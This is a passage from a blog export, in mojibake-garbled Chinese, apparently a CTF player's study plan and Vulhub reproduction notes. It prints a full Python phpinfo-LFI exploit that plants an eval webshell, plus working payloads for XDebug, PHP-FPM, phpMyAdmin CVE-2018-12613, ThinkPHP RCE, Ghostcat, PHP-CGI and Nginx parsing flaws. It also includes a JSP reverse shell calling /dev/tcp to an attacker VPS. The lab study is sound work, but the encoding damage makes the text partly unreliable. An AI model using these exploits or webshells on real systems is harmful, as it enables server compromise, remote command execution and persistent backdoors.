å°±è‡ªé—­äº†ã€‚æœ€éš¾å—çš„å°±æ˜¯é˜Ÿå‹è¾›è‹¦ä»˜å‡ºï¼Œè‡ªå·±å´åŸºæœ¬æ²¡å•¥è¾“å‡ºâ€¦â€¦ä¹‹å‰å…¬ç›Šèµ›è¿˜ä»¥ä¸ºæœ‰äº†ä¸€å®šæ°´å‡†ï¼Œç°åœ¨çœ‹è¿˜å·®å¾—è¿œå•Šã€‚æ‰€ä»¥ä¸€å®šè¦ä¸€å®šè¦å°½å¿«æŠŠèƒ½åŠ›æå‡èµ·æ¥ï¼Œåˆ·é¢˜å›ºç„¶é‡è¦ï¼ŒçŸ¥è¯†ç‚¹ä¹Ÿä¸èƒ½è½ä¸‹ã€‚è¿™æ¬¡æ¯”èµ›æ‰“ä¸‹æ¥å‘ç°è‡ªå·±å±…ç„¶åªèƒ½åœ¨sqlè·ŸNode.jsä¸‹æ‰‹ï¼Œå¤ªå˜²è®½äº†ã€‚æŠŠè¿‘æœŸä¸€äº›éœ€è¦å½»åº•å¼„æ‡‚çš„çŸ¥è¯†ç‚¹åˆ—ä¸€ä¸‹ï¼Œæ€»æœ‰ä¸€å¤©è¦å…¨éƒ¨è§£å†³ã€‚ PHPphpçš„ä¸€äº›trickå†™shell;å‘½ä»¤æ‰§è¡Œ;bypassæŠ€å·§ phpååºåˆ—åŒ–ä¸»è¦æ˜¯popé“¾çš„æ„é€ ã€‚ç®€å•çš„å½“ç„¶ä¼šã€‚éš¾çš„å°±å®¹æ˜“æ‹‰èƒ¯ã€‚è¯´ç™½äº†å°±æ˜¯è‡ªå·±å®¡è®¡èƒ½åŠ›å·®ã€‚æœ€å¥½æŠŠtrickéƒ½ææ¸…æ¥šã€‚ç„¶åå†æŠŠä¸‹é¢çš„æ¡†æ¶çš„popé“¾å¼„ä¸€å¼„ tpæ¡†æ¶5.0 6.0Laravelæ¡†æ¶pythonpythonååºåˆ—åŒ–è¿™æ¬¡ååºåˆ—åŒ–åƒäº†å¤§äºã€‚ç°å­¦éƒ½å¥½å¤šçœ‹ä¸è¿›å»ã€‚æ—¢ç„¶å¦‚æ­¤é‚£å°±åŠ›æ±‚çº¿ä¸‹å¼„æ˜ç™½ã€‚ä¸»è¦æ˜¯åº•å±‚çš„åŸç† Flaskæ¡†æ¶é—®é¢˜ã€‚æƒ³åšè¿˜æ˜¯å¾—ä¼šå¼€å‘ã€‚ å¼€å‘çš„å¤šçº¿ç¨‹ä»€ä¹ˆçš„ã€‚å†™è„šæœ¬çœæ—¶é—´ã€‚py3è·Ÿpy2ä¸€äº›è„šæœ¬çš„å·®åˆ« javajavaååºåˆ—åŒ–å¥½æ­¹è‡ªå·±æœ‰javaåŸºç¡€ã€‚ä¸æ¥è§¦ä¸‹javaæ¼æ´å¤ªæµªè´¹é‚£ä¸€ç‚¹javaçŸ¥è¯†äº†ã€‚ spelæ³¨å…¥javawebtomcat javascriptxss cspè€æ—©çœ‹è¿‡æ¯”è¾ƒå®Œæ•´çš„å´æ²¡æ€»ç»“ã€‚èµ¶ç´§æ€»ç»“ä¸€æ³¢ã€‚ sqliå”¯ä¸€æ¯”è¾ƒè‡ªä¿¡çš„ä¸€é¡¹ã€‚ç»“æœæ¯”èµ›ç¬¬ä¸€é¢˜è¿˜æ˜¯ä¸ä¼šåšã€‚ä¸‡èƒ½å¯†ç ä¹Ÿå·®ç‚¹æ²¡å¼„å‡ºæ¥ã€‚ ä¹‹å‰æ€»ç»“çš„trickå¯èƒ½éœ€è¦å†ç»†åˆ†ä¸€ä¸‹ã€‚ å…¶ä»–çš„vulhubåœ¨å¤ç°äº†,äº‰å–å†å¤šå¤ç°ä¸€äº›é¢˜ç›®ã€‚ CSRFï¼ŒCRLFï¼Œäº‰å–å¤šæ‰¾äº›é¢˜ç›®åš; æ¸—é€å­¦åˆ°çš„çŸ¥è¯†ä¹Ÿæ˜¯å¯ä»¥æ€»ç»“ä¸‹çš„WEBè¿˜æœ‰å¥½å¤šåŸºç¡€æ²¡æ‰“ç‰¢ã€‚æ‰¾æ—¶é—´è¡¥ä¸€è¡¥ã€‚ å±¡è´¥å±¡æˆ˜æ‰æ˜¯ä¸€ä¸ªCTFerçš„ä½œé£ã€‚ç°åœ¨æ—¢ç„¶é€‰æ‹©è¿™æ¡è·¯å°±åŠ æ²¹å¹²ä¸‹å»å§ã€‚","categories":[],"tags":[]},{"title":"Vulhubå¤ç°","slug":"Vulhubå¤ç°","date":"2020-03-06T08:04:04.000Z","updated":"2021-02-18T05:09:53.910Z","comments":true,"path":"2020/03/06/Vulhubå¤ç°/","link":"","permalink":"https://www.bycsec.top/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/","excerpt":"pç‰›å‚ä¸çš„é¡¹ç›®vulhub,å¯¹äºwebå®‰å…¨ä»äº‹äººå‘˜è€Œè¨€åº”è¯¥è¯´æ˜¯å®åº“èˆ¬çš„å­˜åœ¨ã€‚é‡Œé¢è®¸å¤šçš„æ¼æ´éƒ½æ˜¯å€¼å¾—ä¸€ä¸€å»å­¦ä¹ çš„ã€‚åœ¨æ­¤æ„Ÿè°¢é‚£äº›å¤§ä½¬ä¸ºé¡¹ç›®ä½œå‡ºçš„ä»˜å‡ºã€‚æ‰è®©æˆ‘ä»¬èƒ½å¤Ÿè½»æ¾å¤ç°é¢˜ç›®ã€‚ç¯å¢ƒä»githubä¸Šè·å–ã€‚ç¯å¢ƒæ­å»ºåªéœ€docker-compose up -d","text":"pç‰›å‚ä¸çš„é¡¹ç›®vulhub,å¯¹äºwebå®‰å…¨ä»äº‹äººå‘˜è€Œè¨€åº”è¯¥è¯´æ˜¯å®åº“èˆ¬çš„å­˜åœ¨ã€‚é‡Œé¢è®¸å¤šçš„æ¼æ´éƒ½æ˜¯å€¼å¾—ä¸€ä¸€å»å­¦ä¹ çš„ã€‚åœ¨æ­¤æ„Ÿè°¢é‚£äº›å¤§ä½¬ä¸ºé¡¹ç›®ä½œå‡ºçš„ä»˜å‡ºã€‚æ‰è®©æˆ‘ä»¬èƒ½å¤Ÿè½»æ¾å¤ç°é¢˜ç›®ã€‚ç¯å¢ƒä»githubä¸Šè·å–ã€‚ç¯å¢ƒæ­å»ºåªéœ€docker-compose up -d phpinfo+lfi=shellé¦–å…ˆè¯´æ˜ã€‚è¿™æ˜¯ä¸€ä¸ªæ— è§†phpç‰ˆæœ¬çš„æ¼æ´ã€‚å› æ­¤å¯è§å…¶é€šç”¨æ€§ã€‚vulhubä¸Šæä¾›çš„php7çš„ç¯å¢ƒï¼Œä»¥åŠä¸€ä¸ªlfi.phpé¡µé¢æ‰§è¡Œæ–‡ä»¶åŒ…å«ï¼Œä¸€ä¸ªphpinfo.phpæ‰§è¡Œphpinfoã€‚ æ¼æ´åŸç†ï¼š é¦–å…ˆï¼Œæ¼æ´çš„æ“ä½œé¡ºåºæ˜¯ï¼šè·å–phpinfoä¸­çš„ä¸´æ—¶æ–‡ä»¶å â€“&gt; å¯¹ä¸´æ—¶æ–‡ä»¶è¿›è¡ŒåŒ…å« â€“&gt; phpinfoé¡µé¢æ‰§è¡Œç»“æŸï¼Œé”€æ¯ä¸´æ—¶æ–‡ä»¶ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬è®©phpinfoçš„æ‰§è¡Œæ—¶é—´è¶³å¤Ÿå¤§ï¼Œæˆ‘ä»¬çš„æ–‡ä»¶åŒ…å«å°±æœ‰è¶³å¤Ÿæ—¶é—´æ‰§è¡Œã€‚ä»è€Œäº§ç”Ÿä¸€ä¸ªæ°¸ä¹…çš„shellã€‚æ‰€ä»¥åˆ©ç”¨æ—¶ï¼Œä½¿ç”¨çš„æ˜¯åŸç”Ÿçš„socketæ•°æ®ï¼Œå¾€phpinfoä¸­å¡«å……åƒåœ¾ä¿¡æ¯ã€‚phpçš„é»˜è®¤ç¼“å†²åŒºå¤§å°ä¸º4096ä¸ªå­—èŠ‚ï¼Œå°±ç›¸å½“äºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥ã€‚è¿™æ ·ï¼Œå½“æˆ‘ä»¬è·å–åˆ°ä¸´æ—¶æ–‡ä»¶åæ—¶ï¼Œå°±ç«‹å³å‘é€æ–‡ä»¶åŒ…å«è¯·æ±‚ã€‚å°±èƒ½æ‰§è¡Œå‘½ä»¤å¹¶å†™å…¥shelläº†ã€‚ä½¿ç”¨vulhubä¸Šçš„expè„šæœ¬: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#!/usr/bin/python import sysimport threadingimport socketdef setup(host, port): TAG=\"Security Test\" PAYLOAD=\"\"\"%s\\r&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\\r\"\"\" % TAG REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\rContent-Type: text/plain\\r\\r%s-----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD padding=\"A\" * 5000 REQ1=\"\"\"POST /phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\rHTTP_ACCEPT: \"\"\" + padding + \"\"\"\\rHTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\rHTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\rHTTP_PRAGMA: \"\"\"+padding+\"\"\"\\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ=\"\"\"GET /lfi.php?file=%s HTTP/1.1\\rUser-Agent: Mozilla/4.0\\rProxy-Connection: Keep-Alive\\rHost: %s\\r\\r\\r\"\"\" return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = \"\" while len(d) &lt; offset: d += s.recv(offset) try: i = d.index(\"[tmp_name] =&amp;gt; \") fn = d[i+17:i+31] except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fncounter=0class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter &gt;= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print \"\\nGot it! Shell created in /tmp/g\" self.event.set() except socket.error: return def getOffset(host, port, phpinforeq): \"\"\"Gets offset of tmp_name in the php output\"\"\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = \"\" while True: i = s.recv(4096) d+=i if i == \"\": break # detect the final chunk if i.endswith(\"0\\r\\n\\r\\n\"): break s.close() i = d.find(\"[tmp_name] =&amp;gt; \") if i == -1: raise ValueError(\"No php tmp_name in phpinfo output\") print \"found %s at %i\" % (d[i:i+10],i) # padded up a bit return i+256def main(): print \"LFI With PHPInfo()\" print \"-=\" * 30 if len(sys.argv) &lt; 2: print \"Usage: %s host [port] [threads]\" % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print \"Error with hostname %s: %s\" % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print \"Error with port %d: %s\" % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print \"Error with poolsz %d: %s\" % (sys.argv[3], e) sys.exit(1) print \"Getting initial offset...\", reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print \"Spawning worker pool (%d)...\" % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( \"\\r% 4d / % 4d\" % (counter, maxattempts)) sys.stdout.flush() if counter &gt;= maxattempts: break print if e.is_set(): print \"Woot! \\m/\" else: print \":(\" except KeyboardInterrupt: print \"\\nTelling threads to shutdown...\" e.set() print \"Shuttin' down...\" for t in tp: t.join()if __name__==\"__main__\": main() æœ€åå³å¯åœ¨lfié¡µé¢è¾¾æˆä»»æ„å‘½ä»¤æ‰§è¡Œ 1&#x2F;lfi.php?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(&#96;ls&#96;); XDebug rceXDebugæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨äºè°ƒè¯•PHPä»£ç ã€‚å¦‚æœç›®æ ‡å¼€å¯äº†è¿œç¨‹è°ƒè¯•æ¨¡å¼ï¼Œå¹¶è®¾ç½®remote_connect_back = 1è¿™ä¸ªé…ç½®ä¸‹ï¼Œæˆ‘ä»¬è®¿é—®http://target/index.php?XDEBUG_SESSION_START=phpstorm,ç›®æ ‡æœåŠ¡å™¨çš„XDebugå°†ä¼šè¿æ¥è®¿é—®è€…çš„IPï¼ˆæˆ–X-Forwarded-Forå¤´æŒ‡å®šçš„åœ°å€ï¼‰å¹¶é€šè¿‡dbgpåè®®ä¸å…¶é€šä¿¡ï¼Œæˆ‘ä»¬é€šè¿‡dbgpä¸­æä¾›çš„evalæ–¹æ³•å³å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPä»£ç ã€‚(ç±»ä¼¼äºä¹‹å‰çš„java jdwp,éƒ½æ˜¯ä¸€ä¸ªè°ƒè¯•æ¨¡å¼ï¼ŒåŒæ—¶ç›‘å¬äº†æŒ‡å®šç«¯å£ï¼Œè®©æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‘½ä»¤æ‰§è¡Œ)åœ¨æ¼æ´ç¯å¢ƒphpinfoä¸­å¯ä»¥çœ‹åˆ°xdebugçš„é…ç½®è¿›è€Œæ‰¾åˆ°xdebugå¼€å¯ä½¿ç”¨è„šæœ¬ï¼Œæ³¨æ„éœ€è¦python3,åŒæ—¶è¦è¿è¡Œåœ¨æœ‰å…¬ç½‘ipçš„æœºå™¨ä¸Šã€‚ 1python3 exp.py -t http:&#x2F;&#x2F;ip:port&#x2F;index.php -c &#39;system(&#39;id&#39;);&#39; å› ä¸ºè„šæœ¬å®é™…ä¸Šå®ç°çš„æ˜¯ç›‘å¬æœ¬åœ°9000ç«¯å£å¹¶ç­‰å¾…xdebugçš„è¿æ¥ã€‚å› æ­¤è¦ä¹ˆå¤„äºåŒä¸€å†…ç½‘ï¼Œè¦ä¹ˆè‡ªå·±æœ‰å…¬ç½‘ip. php-fpm Fastcgiå…·ä½“ä½¿ç”¨åœ¨ä¹‹å‰çš„NCTF2019 phar matches everything ä¸­å·²ç»ç”¨è¿‡äº†ã€‚ç”±äºPHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡è€Œfpmä¸­æœ‰ä¸€ä¸ªé‡è¦çš„ç¯å¢ƒå˜é‡å‚æ•°ï¼ŒSCRIPT_FILENAMEã€‚åªè¦å®ƒæ˜¯ä¸€ä¸ªæœåŠ¡å™¨ä¸Šå­˜åœ¨çš„æ–‡ä»¶ï¼Œå°±å¯ä»¥æ‰§è¡Œphpæ–‡ä»¶ã€‚å·²çŸ¥åŸç†åï¼Œåé¢å®ç°å…¶å®å°±ä¸éš¾äº†ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡åè®®æ‰§è¡Œä»»æ„æ–‡ä»¶ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œåªè¦æ‰§è¡Œä¸€ä¸ªauto_prepend_fileä¸ºphp://inputå¹¶å¼€å¯allow_url_include = Onã€‚å®ƒåœ¨æ‰§è¡Œä»»æ„phpæ–‡ä»¶æ—¶éƒ½ä¼šæŠŠæˆ‘ä»¬postçš„å†…å®¹å¸¦è¿›å»ã€‚è¿›è€Œè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ 1python exp.py ip /usr/local/lib/php/PEAR.php -p 9000 -c '&lt;?php echo `id`;exit();?&gt;' phpmyadmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´CVE-2018-12613ã€‚ä¹‹å‰æ›¾ç»åœ¨å¹¿å¤–çš„æ¯”èµ›åšè¿‡ã€‚åº”è¯¥è¯´æœ‰è®¸å¤šç§getshellæ–¹å¼ï¼Œåªä¸è¿‡å„æœ‰åƒç§‹å§ã€‚ä¸»è¦æ¼æ´å‡ºåœ¨db_sql.php,ç”±äºé‡Œé¢ä¸€ä¸ªurlencodeå‡½æ•°çš„ä½¿ç”¨ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡äºŒæ¬¡ç¼–ç ç»•è¿‡å¹¶æ–‡ä»¶åŒ…å«ã€‚target=db_sql.php%253f/../../../../../../../../etc/passwdè¿›ä¸€æ­¥å¯ä»¥getshellç›´æ¥æ‰§è¡Œsqlè¯­å¥ 1select &#96;&lt;?&#x3D;phpinfo();?&gt;&#96;; è®¿é—®è‡ªå·±çš„sessionç¼“å­˜æ–‡ä»¶ 1target&#x3D;db_sql.php%253f&#x2F;....&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;tmp&#x2F;sess_ce21bdd74738d8aaff45c82288addcb7 æ‰€ä»¥å½“ç„¶å¯ä»¥æ‰§è¡Œsqlè¯­å¥select &#39;&lt;?php @eval($_GET[&quot;byc&quot;]);?&gt;&#39;å†™å…¥ä¸€å¥è¯å¹¶åŒ…å« 1?target&#x3D;db_sql.php%253f&#x2F;....&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;tmp&#x2F;sess_43a49651429f0e100e0d55c016f338b5&amp;byc&#x3D;system(%27ls%27); è²Œä¼¼ä¹‹å‰å¬è¯´è¿™ä¸ªç‰ˆæœ¬åªèƒ½ç”¨getçš„ä¸€å¥è¯ï¼Œæ‰€ä»¥è¿˜æ˜¯å†™getçš„ä¸€å¥è¯å°±å¥½ã€‚ ThinkPHP RCEThinkPHP5 5.0.22/5.1.29å¤§è‡´çœ‹äº†ä¸‹ï¼Œè²Œä¼¼æ˜¯å› ä¸ºå‘½åç©ºé—´çš„ç¬¦å·ä½¿ç”¨å¯¼è‡´æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„ç±»payload 1?s&#x3D;&#x2F;Index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;-1 å¯ä»¥ç›´æ¥rce&amp;vars[0]=system&amp;vars[1][]=lsä¹Ÿå¯ä»¥å†™ä¸€ä¸ªshell.php 1?s&#x3D;&#x2F;Index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell.php&amp;vars[1][]&#x3D;&lt;%3fphp+%40eval(%24_GET%5b%27byc%27%5d)%3b%3f&gt; ThinkPHP5 5.0.23ä¹Ÿæ˜¯æ¯”è¾ƒå¸¸è§çš„ä¸€ä¸ªç‰ˆæœ¬ 12345GET:?s&#x3D;captchaPOST:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;whoami TomcatGhostcat CVE-2020-1938å¹½çµçŒ«ã€‚è¿™é‡Œçš„ç¯å¢ƒåªæä¾›äº†æ–‡ä»¶è¯»å–. 1python3 ajpShooter.py http://vpsip/ 8009 /WEB-INF/web.xml read æƒ³è¦è¿›è¡ŒRCEè¿˜éœ€è¦ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚è¿™é‡Œç›´æ¥è¿›å…¥å®¹å™¨å¢åŠ ä¸€ä¸ªexp.jspdocker exec -it å®¹å™¨id /bin/bashæ²¡æœ‰vim.ç”¨curlææ¥ä¸€ä¸ªexp.jspåˆ°/WEB-INFä¸‹ 12345678910111213&lt;%@ page import=\"java.util.*,java.io.*\"%&gt;&lt;% out.println(\"Executing command\");Process p = Runtime.getRuntime().exec(\"ls /\");OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125;%&gt; ä½¿ç”¨å‘½ä»¤ 1python3 ajpShooter.py http:&#x2F;&#x2F;vpsip&#x2F; 8009 &#x2F;WEB-INF&#x2F;exp.jsp eval å°è¯•äº†ä¸‹å¼¹shellçš„å‘½ä»¤å¤±è´¥äº†ã€‚ä½†æ˜¯é—®é¢˜æ‰¾ä¸å‡ºæ¥ã€‚æœ€å¥½åœ¨æ¯”èµ›ä¸­ä¸è¦èŠ±æ—¶é—´æ‰§ç€äºå¼¹shellã€‚å¯èƒ½ä¼šæœ‰å¤§é—®é¢˜ã€‚ è¡¥ï¼šç»éƒå¸ˆå‚…æŒ‡ç‚¹æ˜ç™½äº†æ˜¯jspçš„é—®é¢˜ã€‚å…·ä½“åŸå› ä¹‹åè§£é‡Šï¼Œç®€è¦è¯´ä¸»è¦æ˜¯javaå¼¹shellæ—¶ä½¿ç”¨å­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²æ•°ç»„çš„åŒºåˆ«ã€‚ 12345&lt;%@ page import=\"java.util.*,java.io.*\"%&gt;&lt;% String[] cmdstr = &#123; \"/bin/bash\", \"-c\", \"bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\" &#125;; Runtime.getRuntime().exec(cmdstr);%&gt; è¿™æ ·å°±èƒ½å¼¹shelläº†ã€‚ tomcat7+ å¼±å£ä»¤ &amp;&amp; åå°getshellæ¼æ´å› ä¸ºWUSTé‚£é“é¢˜è¿‡æ¥å¤ç°äº†ä¸‹ã€‚è¿˜æƒŠäººçš„é‡ç°äº†ï¼šé‡å¤ä½¿ç”¨ä¸€ä¸ªä¸€æ¬¡æ€§çš„cookieä¹Ÿä¼šé€ æˆ403çš„é—®é¢˜ã€‚çœ‹æ¥é¢˜ç›®æœç„¶æºäºç”Ÿæ´»ã€‚ æ­¥éª¤å¾ˆç®€å•ã€‚ç¬¬ä¸€æ­¥tomcatå¼±å£ä»¤ç™»å…¥manager/htmlåå°æ­£å¸¸å®‰è£…çš„æƒ…å†µä¸‹ï¼Œtomcat8ä¸­é»˜è®¤æ²¡æœ‰ä»»ä½•ç”¨æˆ·ï¼Œä¸”manageré¡µé¢åªå…è®¸æœ¬åœ°IPè®¿é—®ã€‚åªæœ‰ç®¡ç†å‘˜æ‰‹å·¥ä¿®æ”¹äº†è¿™äº›å±æ€§çš„æƒ…å†µä¸‹ï¼Œæ‰å¯ä»¥è¿›è¡Œæ”»å‡»ã€‚ç”±äºåå°æ”¯æŒéƒ¨ç½²waræ–‡ä»¶ï¼Œç›´æ¥ä¸Šä¼ warå³å¯getshellæ­¥éª¤:1.cmd.jsp 123&lt;% %&gt; jar cvf webshell.war webshell.jspç”Ÿæˆwebshell2.å‘½ä»¤æ‰§è¡Œ/webshell/exp.jsp?pwd=023&amp;i=id) PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰å‡ºç°åœ¨ä»¥cgiæ¨¡å¼è¿è¡Œçš„phpä¸­ï¼Œå½±å“ç‰ˆæœ¬ php &lt; 5.3.12 or php &lt; 5.4.2ç®€å•è¯´å°±æ˜¯å‘½ä»¤è¡Œçš„å‚æ•°å¯ä»¥é€šè¿‡querysringçš„å½¢å¼ä¼ å…¥ã€‚æ¯”å¦‚ç›´æ¥ä¼ -sindex.php?-sç›´æ¥å›æ˜¾æºç ã€‚è¿›ä¸€æ­¥åˆ©ç”¨è¿™ç‚¹ï¼Œåˆ™é€šè¿‡-dä½¿ç”¨php://inputè¾¾æˆæ–‡ä»¶åŒ…å«=&gt;å‘½ä»¤æ‰§è¡Œã€‚payload POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input 1data: &lt;?php echo &#96;ls&#96;; ?&gt; httpdApache HTTPD å¤šåç¼€è§£ææ¼æ´Apache HTTPD æ”¯æŒä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªåç¼€å‡å¦‚é…ç½®å¦‚ä¸‹ 1AddHandler application/x-httpd-php .php é‚£ä¹ˆåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰.phpåç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆPHPæ–‡ä»¶æ‰€ä»¥å¯ä»¥ä½¿ç”¨ä¸Šä¼ æ—¶åŠ åç¼€ç»•è¿‡ è®¿é—®ä¸Šä¼ 1.php.jpgå³å¯å‘ç°å…¶è¢«è§£æä¸ºphp Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ä¹‹å‰æ¥è§¦è¿‡çš„shtml çš„å‘½ä»¤æ‰§è¡Œ&lt;!--#exec cmd=&quot;ls&quot; --&gt; ä¹‹å‰HITCON2018 WhySoSerialä¸­ä¹Ÿæœ‰ç”¨åˆ°å®ƒè¿›è¡Œæ–‡ä»¶åŒ…å«çš„åˆ©ç”¨,è¿™ä¹Ÿæ˜¯shtmlçš„Server-Side Includeså³ssiçš„ç‰¹æ€§äº†ã€‚ Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰ç¯å¢ƒæœ‰é—®é¢˜â€¦æ²¡æ³•å¤ç°äº†å¤§æ¦‚å°±æ˜¯ä¸Šä¼ phpè¢«banæ—¶,é€šè¿‡.php%0aç»•è¿‡ï¼Œä½†æ˜¯è®¿é—®æ–‡ä»¶æ—¶æ—¶ä»èƒ½è¢«è§£ææˆphp nginxNginx è§£ææ¼æ´å¤ç°è¿™ä¸ªæ´ç›´æ¥å¸®æˆ‘è§£å†³æŸå…¥ç¾¤é¢˜å›°æ‰°äº†å¥½ä¹…çš„ä¸€ä¸ªç‚¹ã€‚ä¹Ÿè§£å†³äº†æˆ‘åŸæ¥åœ¨åšæœ‰å…³nginxæœ‰å…³æœåŠ¡çš„é¢˜ç›®æ—¶é‡åˆ°çš„å¥‡ç‰¹ç°è±¡ã€‚è¯¥æ¼æ´ä¸Nginxã€phpç‰ˆæœ¬æ— å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“é€ æˆçš„è§£ææ¼æ´ è¿›å…¥ç¯å¢ƒã€‚ç›´æ¥ä¸Šä¼ ä¸€ä¸ªGIF89A&lt;?php @eval($_POST[0]);?&gt;çš„1.jpgç»•è¿‡æ£€æµ‹ï¼Œä¸Šä¼ å›¾ç‰‡ã€‚ åŒæ—¶è®¿é—®å›¾ç‰‡ã€‚ ä½†æ˜¯ä¸€æ—¦åœ¨jpgååŠ ä¸Š/.phpè¿™ä¸ªé©¬å°±å°†è¢«ä½œä¸ºphpè§£ææˆåŠŸgetshell å› æ­¤å¯ä»¥ç”¨åœ¨æŸäº›ç‰¹æ®Šçš„ä¸Šä¼ é¢˜ç›®ä¸­ã€‚å¾—åˆ°webshellç«Ÿå¯ä»¥å¦‚æ­¤ç®€å•,ä¹Ÿç®—æ˜¯ä¸€ä¸ªå°æŠ€å·§äº†ã€‚ è‡³äºåŸå› çš„è¯,è¿˜æ˜¯ç”±äºnginxçš„é…ç½®é—®é¢˜ã€‚ä¸€æ—¦é…ç½®æˆæŠŠä»¥.phpç»“å°¾çš„æ–‡ä»¶äº¤ç»™fastcgiå¤„ç†,é‡åˆ°æˆ‘ä»¬çš„/.phpå°±ç›´æ¥æ‰”ç»™phpäº†ã€‚ ä¸”php.iniè®¾ç½®äº†cgi.fix_pathinfo=1æ—¶,fastcgiä¼šè‡ªåŠ¨æ‰¾åˆ°ä¸Šçº§çš„1.jpgå¤„ç†ã€‚æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯php-fpm.confä¸­çš„security.limit_extensionsé…ç½®é¡¹é™åˆ¶äº†fastcgiè§£ææ–‡ä»¶çš„ç±»å‹è¿™é¡¹ä¸ºç©ºæ—¶å°±ä¼šå°†jpgæ–‡ä»¶å½“åšä»£ç è§£æã€‚ æ‰€ä»¥åªè¦ 1ã€ å°†php.iniæ–‡ä»¶ä¸­çš„cgi.fix_pathinfoçš„å€¼è®¾ç½®ä¸º0,è¿™æ ·phpå†è§£æ1.php/1.jpgè¿™æ ·çš„ç›®å½•æ—¶,åªè¦1.jpgä¸å­˜åœ¨å°±ä¼šæ˜¾ç¤º404é¡µé¢ 2ã€ php-fpm.confä¸­çš„security.limit_extensionsåé¢çš„å€¼è®¾ç½®ä¸º.php 